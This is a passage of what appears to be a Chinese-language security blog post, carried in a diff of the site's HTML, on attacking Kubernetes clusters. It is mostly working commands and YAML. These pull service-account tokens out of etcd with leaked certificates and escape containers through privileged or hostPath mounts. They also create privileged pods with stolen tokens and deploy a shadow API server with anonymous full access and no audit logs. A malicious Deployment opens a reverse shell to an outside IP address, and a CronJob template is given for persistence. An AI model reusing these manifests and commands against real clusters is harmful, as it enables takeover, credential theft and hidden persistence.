class="string">--peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--peer-key-file=/etc/kubernetes/pki/etcd/peer.key</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/var/lib/etcd</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">etcd-data</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/etc/kubernetes/pki/etcd</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">etcd-certs</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/var/lib/etcd</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">etcd-data</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/etc/kubernetes/pki/etcd</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">etcd-certs</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>证书泄露利用</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> ETCDCTL_CERT=/etc/kubernetes/pki/etcd/peer.crt</span><br><span class="line"><span class="built_in">export</span> ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt</span><br><span class="line"><span class="built_in">export</span> ETCDCTL_KEY=/etc/kubernetes/pki/etcd/peer.key</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取token</span></span><br><span class="line">./etcdctl --endpoints=https://127.0.0.1:2379/ get --keys-only --prefix=<span class="literal">true</span> <span class="string">&quot;/&quot;</span> | grep /secrets/kube-system/clusterrole</span><br><span class="line">./etcdctl --endpoints=https://127.0.0.1:2379/ get /registry/secrets/kube-system/clusterrole-aggregation-controller-token</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过该token可以获取k8s集群的权限</span></span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://127.0.0.1:6443 --token=<span class="string">&quot;&quot;</span> -n kube-system get pods</span><br></pre></td></tr></table></figure>
+
+<h3 id="5、kubectl-proxy"><a href="#5、kubectl-proxy" class="headerlink" title="5、kubectl proxy"></a>5、kubectl proxy</h3><p>kubectl proxy用于创建一个简单的 HTTP 代理服务器，通过该代理服务器，可以轻松地访问Kubernetes 集群中的 API 服务器。默认情况下，kubectl proxy 仅监听本地地址，但可以通过一些参数和选项将它对外暴露。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将代理服务器绑定到所有网络接口并监听 8001 端口</span></span><br><span class="line">kubectl proxy --address=0.0.0.0 --port=8001</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用执行</span></span><br><span class="line">kubectl -s ip:8081 get pods -n</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-容器逃逸"><a href="#0x02-容器逃逸" class="headerlink" title="0x02 容器逃逸"></a>0x02 容器逃逸</h2><p>容器逃逸的过程是一个受限进程获取未受限的完整权限，又或某个原本受 Cgroup&#x2F;Namespace 限制权限的进程获取更多权限的操作，如下几种逃逸手法在防御团队中暴露的概率从大到小</p>
+<h3 id="privileged-容器内-mount-device"><a href="#privileged-容器内-mount-device" class="headerlink" title="privileged 容器内 mount device"></a>privileged 容器内 mount device</h3><p>当进入 privileged 特权容器内部时，可以使用 fdisk -l 查看宿主机的磁盘设备，如果不在 privileged 容器内部，是没有权限查看磁盘列表并操作挂载的。</p>
+<p>因此，在特权容器里，可以把宿主机里的根目录 &#x2F; 挂载到容器内部，从而去操作宿主机内的任意文件，例如 crontab config file, &#x2F;root&#x2F;.ssh&#x2F;authorized_keys, &#x2F;root&#x2F;.bashrc 等文件，而达到逃逸目的</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line"><span class="built_in">mkdir</span> /tmp/pock_mount</span><br><span class="line">mount /dev/vda1 /tmp/pock_mount</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /tmp/pock_mount</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-利用与持久化"><a href="#0x03-利用与持久化" class="headerlink" title="0x03 利用与持久化"></a>0x03 利用与持久化</h2><h3 id="1-部署恶意Pod"><a href="#1-部署恶意Pod" class="headerlink" title="1. 部署恶意Pod"></a>1. 部署恶意Pod</h3><ul>
+<li>反弹shell</li>
+</ul>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span>  <span class="comment">#确保在任何时候都有特定数量的Pod副本处于运行状态</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-deploy</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">nginx-test</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span>  <span class="comment">#指定Pod副本数量</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">hostPID:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.7.9</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">        <span class="attr">command:</span> [<span class="string">&quot;bash&quot;</span>] <span class="comment">#反弹Shell</span></span><br><span class="line">        <span class="attr">args:</span> [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/123.56.244.180/22339 0&gt;&amp;1&quot;</span>]</span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">true</span> <span class="comment">#特权模式</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/host</span>  <span class="comment"># 创建后门Pod/挂载主机路径</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">host-root</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">host-root</span></span><br><span class="line">        <span class="attr">hostPath:</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">          <span class="attr">type:</span> <span class="string">Directory</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nv -lvnp 22339</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>容器逃逸</li>
+</ul>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">test-233</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test-233</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.14.2</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">host</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/host</span>  <span class="comment"># 创建后门Pod/挂载主机路径</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">host</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">Directory</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在default命名空间中创建pod</span></span><br><span class="line">kubectl apply -f shell.yaml -n default --insecure-skip-tls-verify=<span class="literal">true</span></span><br><span class="line"><span class="comment">#进入容器中</span></span><br><span class="line">kubectl <span class="built_in">exec</span> -it test-233 bash -n default --insecure-skip-tls-verify=<span class="literal">true</span></span><br><span class="line"><span class="comment">#切换bash，逃逸成功</span></span><br><span class="line"><span class="built_in">cd</span> /host</span><br><span class="line"><span class="built_in">chroot</span> ./ bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-利用Service-Account"><a href="#2-利用Service-Account" class="headerlink" title="2. 利用Service Account"></a>2. 利用Service Account</h3><p>K8s集群创建的Pod中，容器内部默认携带K8s Service Account的认证凭据，路径为：<code>/run/secrets/kubernetes.io/serviceaccount/token</code></p>
+<ul>
+<li>利用Pod中的Token访问API Server</li>
+</ul>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指向内部 API 服务器主机名</span></span><br><span class="line"><span class="string">export</span> <span class="string">APISERVER=https://$&#123;KUBERNETES_SERVICE_HOST&#125;</span></span><br><span class="line"><span class="comment">#设置 ServiceAccount 令牌的路径</span></span><br><span class="line"><span class="string">export</span> <span class="string">SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount</span></span><br><span class="line"><span class="comment">#读取 pods 命名空间并将其设置为变量。</span></span><br><span class="line"><span class="string">export</span> <span class="string">NAMESPACE=$(cat</span> <span class="string">$&#123;SERVICEACCOUNT&#125;/namespace)</span></span><br><span class="line"><span class="comment">#读取 ServiceAccount 不记名令牌</span></span><br><span class="line"><span class="string">export</span> <span class="string">TOKEN=$(cat</span> <span class="string">$&#123;SERVICEACCOUNT&#125;/token)</span></span><br><span class="line"><span class="comment"># CACERT 路径</span></span><br><span class="line"><span class="string">export</span> <span class="string">CACERT=$&#123;SERVICEACCOUNT&#125;/ca.crt</span></span><br><span class="line"><span class="string">执行以下命令查看当前集群中所有Namespaces。</span></span><br><span class="line"><span class="string">curl</span> <span class="string">--cacert</span> <span class="string">$&#123;CACERT&#125;</span> <span class="string">--header</span> <span class="string">&quot;Authorization: Bearer $&#123;TOKEN&#125;&quot;</span> <span class="string">-X</span> <span class="string">GET</span> <span class="string">$&#123;APISERVER&#125;/api/v1/namespaces</span></span><br><span class="line"><span class="comment">#写入yaml,创建特权Pod</span></span><br><span class="line"><span class="string">cat</span> <span class="string">&gt;</span> <span class="string">nginx-pod.yaml</span> <span class="string">&lt;&lt;</span> <span class="string">EOF</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">test-444</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test-444</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.14.2</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">host</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/host</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">host</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">Directory</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="comment">#创建pod</span></span><br><span class="line"><span class="string">curl</span> <span class="string">--cacert</span> <span class="string">$&#123;CACERT&#125;</span> <span class="string">--header</span> <span class="string">&quot;Authorization: Bearer $&#123;TOKEN&#125;&quot;</span> <span class="string">-k</span> <span class="string">$&#123;APISERVER&#125;/api/v1/namespaces/default/pods</span> <span class="string">-X</span> <span class="string">POST</span> <span class="string">--header</span> <span class="string">&#x27;content-type: application/yaml&#x27;</span> <span class="string">--data-binary</span> <span class="string">@nginx-pod.yaml</span></span><br><span class="line"><span class="comment">#查看信息</span></span><br><span class="line"><span class="string">curl</span> <span class="string">--cacert</span> <span class="string">$&#123;CACERT&#125;</span> <span class="string">--header</span> <span class="string">&quot;Authorization: Bearer $&#123;TOKEN&#125;&quot;</span> <span class="string">-X</span> <span class="string">GET</span> <span class="string">$&#123;APISERVER&#125;/api/v1/namespaces/default/pods/nginx</span></span><br><span class="line"><span class="comment">#执行命令</span></span><br><span class="line"><span class="string">curl</span> <span class="string">--cacert</span> <span class="string">$&#123;CACERT&#125;</span> <span class="string">--header</span> <span class="string">&quot;Authorization: Bearer $&#123;TOKEN&#125;&quot;</span> <span class="string">-X</span> <span class="string">GET</span> <span class="string">$&#123;APISERVER&#125;/api/v1/namespace/default/pods/test-444/exec?command=ls&amp;command=-l</span></span><br><span class="line"><span class="string">or</span></span><br><span class="line"><span class="string">api/v1/namespaces/default/pods/nginx-deployment-66b6c48dd5-4djlm/exec?command=ls&amp;command=-l&amp;container=nginx&amp;stdin=true&amp;stdout=true&amp;tty=true</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-shadow-api-server"><a href="#3-shadow-api-server" class="headerlink" title="3. shadow api server"></a>3. shadow api server</h3><p>部署一个shadow api server开启了全部k8s权限，接受匿名请求且不保存审计日志，这将方便攻击者无痕管理整个集群。</p>
+<ul>
+<li>Shadow API Server的配置与利用</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">配置文件路径：</span><br><span class="line">/etc/systemd/system/kube-apiserver-test.service</span><br><span class="line"><span class="comment">#一键部署Shadow apiserver</span></span><br><span class="line">./cdk run k8s-shadow-apiserver default</span><br><span class="line"></span><br><span class="line"><span class="comment">#一键部署将在配置文件中添加了如下选项：</span></span><br><span class="line">--allow-privileged</span><br><span class="line">--insecure-port=9443</span><br><span class="line">--insecure-bind-address=0.0.0.0</span><br><span class="line">--secure-port=9444</span><br><span class="line">--anonymous-auth=<span class="literal">true</span></span><br><span class="line">--authorization-mode=AlwaysAllow</span><br><span class="line"></span><br><span class="line"><span class="comment">#kcurl访问与利用</span></span><br><span class="line">./cdk kcurl anonymous get https://192.168.1.44:9443/api/v1/secrets</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-cronjob持久化"><a href="#4-cronjob持久化" class="headerlink" title="4. cronjob持久化"></a>4. cronjob持久化</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">batch/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">CronJob</span>  <span class="comment">#使用CronJob对象</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">hello</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">schedule:</span> <span class="string">&quot;*/1 * * * *&quot;</span> <span class="comment">#每分钟执行一次</span></span><br><span class="line">  <span class="attr">jobTemplate:</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">template:</span></span><br><span class="line">        <span class="attr">spec:</span></span><br><span class="line">          <span class="attr">containers:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">hello</span></span><br><span class="line">            <span class="attr">image:</span> <span class="string">busybox</span></span><br><span class="line">            <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">            <span class="attr">command:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">/bin/sh</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">            <span class="bullet">-</span> <span class="comment">#反弹Shell或者木马</span></span><br><span class="line">          <span class="attr">restartPolicy:</span> <span class="string">OnFailure</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/security/blog/2020/04/02/attack-matrix-kubernetes/">https://www.microsoft.com/en-us/security/blog/2020/04/02/attack-matrix-kubernetes/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/neargle/my-re0-k8s-security">https://github.com/neargle/my-re0-k8s-security</a></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CloudSec/" rel="tag" <i class="fa fa-tag"></i> CloudSec</a>
+              <a href="/tags/K8S/" rel="tag" <i class="fa fa-tag"></i> K8S</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/10086/" rel="next" title="云上攻击面总结">
+                  云上攻击面总结 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">L0n9w4y</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
